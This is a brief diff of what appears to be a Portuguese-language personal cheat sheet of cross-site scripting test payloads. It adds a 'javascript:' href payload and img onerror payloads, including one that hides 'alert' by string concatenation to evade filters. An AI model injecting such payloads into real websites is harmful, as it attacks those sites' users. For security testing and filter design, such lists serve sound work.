@@ -75,11 +75,15 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 
 .
 
-	<img src="invalid.jpg" onerror="alert('XSS Persistente!')"> 
+	javascript:alert('XSS href')
+
+.
+
+	<img src="invalid.jpg" onerror="alert('XSS IMG!')"> 
  
 .
 
-	<img src="x" onerror="window['aler'+'t']('XSS Persistente!')">
+	<img src="x" onerror="window['aler'+'t']('XSS OnError!')">
 
 .
 
